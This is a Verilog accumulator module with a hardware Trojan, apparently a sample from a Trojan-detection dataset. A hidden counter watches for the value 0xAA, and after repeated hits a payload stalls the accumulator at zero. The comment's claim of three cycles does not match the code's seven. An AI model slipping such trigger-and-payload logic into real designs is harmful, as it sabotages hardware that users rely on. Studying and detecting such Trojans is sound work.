module accum8(input clk, input rst_n, input en, input [7:0] din,
               output reg [7:0] acc);

  // Trojan: sequential counter that activates when acc reaches 8'hAA
  reg [2:0] trojan_cnt;

  always @(posedge clk or negedge rst_n) begin
    if (!rst_n) begin
      trojan_cnt <= 3'b0;
    end else if (en) begin
      if (acc == 8'hAA)
        trojan_cnt <= trojan_cnt + 1'b1;
      else
        trojan_cnt <= 3'b0;
    end
  end

  always @(posedge clk or negedge rst_n) begin
    if (!rst_n) begin
      acc <= 8'b0;
    end else if (en) begin
      // Trojan payload: when counter saturates (3 consecutive cycles with acc==8'hAA),
      // degrade performance by stalling acc at 0
      if (trojan_cnt == 3'b111)
        acc <= 8'b0;
      else
        acc <= acc + din;
    end
  end

endmodule